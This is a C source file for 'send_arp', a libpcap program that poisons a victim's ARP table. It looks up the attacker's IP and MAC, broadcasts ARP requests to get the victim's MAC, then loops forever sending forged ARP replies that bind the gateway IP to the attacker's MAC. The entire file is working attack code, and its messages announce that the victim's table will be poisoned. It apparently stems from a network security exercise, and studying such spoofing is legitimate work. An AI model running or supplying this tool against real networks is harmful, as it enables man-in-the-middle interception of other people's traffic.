/*======================================================================*/
/* Program Description */
/* 
 * Fake sender(=victim)'s ARP table by sending arp packets
 * sender ip == victim ip
 * target ip usually set as gateway ip
 * 
 * Send user defined buffer as packet, using pcap_sendpacket()
 * Find attacker(=you)'s MAC information (@google)
 * 
 * Three entities: attacker, sender (victim), target (gateway)
 * 
 * 1. Find attacker IP address
 * 2. Find attacker MAC address
 * 3. Send ARP request and receive ARP reply to identify target MAC address
 * 4. Send ARP reply to target
 *
 * Copyright © 2018 James Sung. All rights reserved.
 */
/*======================================================================*/


#include "functions.h"

// ./send_arp <interface> <sender ip> <target ip>
int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		PRINT_USAGE();
		puts("[*] Exiting program with -1");
		return -1;
	}
	
	puts("[+] Running program...\n");
	
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", dev, errbuf);
		puts("[*] Exiting program with -1");
		return -1;
	}

	char                attacker_IP_char[16];
	struct in_addr     *attacker_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            attacker_IP_int;
	uint8_t            *attacker_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t            sender_IP_int;
	uint8_t            *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            target_IP_int;

	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;

	my_etharp_hdr      *arp_request        = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_request_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));

	my_etharp_hdr      *arp_reply          = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));
	

	inet_aton(argv[3], target_IP_struct);
	target_IP_int = target_IP_struct->s_addr;
	
/* get attacker ip address */
	int n;
	struct ifreq ifr;
 
	n = socket(AF_INET, SOCK_DGRAM, 0);
	
	//Type of address to retrieve - IPv4 IP address
	ifr.ifr_addr.sa_family = AF_INET;
	
	//Copy the interface name in the ifreq structure
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
	ioctl(n, SIOCGIFADDR, &ifr);
	close(n);
	
	strcpy(attacker_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	//display result
	printf("[Attacker IP  Address] "); PRINT_IP(attacker_IP_char);
	puts("");
	
	inet_aton(attacker_IP_char, attacker_IP_struct);
	attacker_IP_int = attacker_IP_struct->s_addr;

/* get attacker mac address */
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(s.ifr_name, dev);
	if (!ioctl(fd, SIOCGIFHWADDR, &s))
	{
		printf("[Attacker MAC Address] ");
		for (int i = 0; i < 6; i++)
		{
			attacker_MAC_array[i] = s.ifr_addr.sa_data[i];
		}
		PRINT_MAC(attacker_MAC_array);
		puts("");
	}
	puts("");

/* send arp request broadcast */
	printf("[Sender   IP  Address] %s\n\n", argv[2]);

	inet_aton(argv[2], sender_IP_struct);

	sender_IP_int = sender_IP_struct->s_addr;

	printf("[+] Creating ARP request packet: ");
	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
	printf("Done\n");
	
	memcpy(arp_request_packet, arp_request, sizeof(my_etharp_hdr));

	printf("[+] Broadcasting ARP request, 5 times: ");
	for (int i = 0; i < 5; i++)
	{
		if (pcap_sendpacket(handle, arp_request_packet, sizeof(my_etharp_hdr)))
		{
			puts("Failed!");
			puts("[-] Failed to send packet");
			puts("[*] Exiting program with return -1");
			pcap_perror(handle, 0);	
			return -1;
		}
		sleep(0.1);
	}
	puts("Done");

	printf("[+] Getting sender MAC address from ARP reply packet: ");
	while (1)
	{
		int res = pcap_next_ex(handle, &header, &packet);
	
		if (res == 0)               continue;
		if (res == -1 || res == -2) break;

		uint16_t PCKT_ETHERTYPE = (packet[12] << 8) | packet[13];
		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PCKT_ARPOP = (packet[20] << 8) | packet[21];
		if (PCKT_ARPOP != ARPOP_REPLY) { continue; }
		
		// compute regarding little-endian
		uint32_t PCKT_ARPSPA = (packet[31] << 24) | (packet[30] << 16) | (packet[29] << 8) | (packet[28]);
		if (PCKT_ARPSPA != sender_IP_int) { continue; }

		memcpy(sender_MAC_array, (packet + 22), 6 * sizeof(uint8_t));

		puts("Done\n");
		printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array);
		
		puts("");
		puts("");
		break;
	}

	printf("[+] Creating fake ARP reply packet: ");

	MAKE_ARPREP_STRUCT(arp_reply, attacker_MAC_array, attacker_IP_int, sender_MAC_array, sender_IP_int, target_IP_int);
	puts("Done");
	
	STRUCT2PACKET(arp_reply_packet, arp_reply);
	memcpy(arp_reply_packet, arp_reply, sizeof(my_etharp_hdr));

	puts("[+] Success!");
	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> ARP table will be poisoned!\n", argv[2]);
	while (1)
	{
		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
		puts(".");
		sleep(1);
	}


	pcap_close(handle);
	free(attacker_IP_struct); free(attacker_MAC_array);
	free(sender_IP_struct);   free(sender_MAC_array);
	free(target_IP_struct);   free(header);
	free(arp_request);        free(arp_request_packet);
	free(arp_reply);          free(arp_reply_packet);

	puts("[*] Exiting program with 0");

	return 0;
}





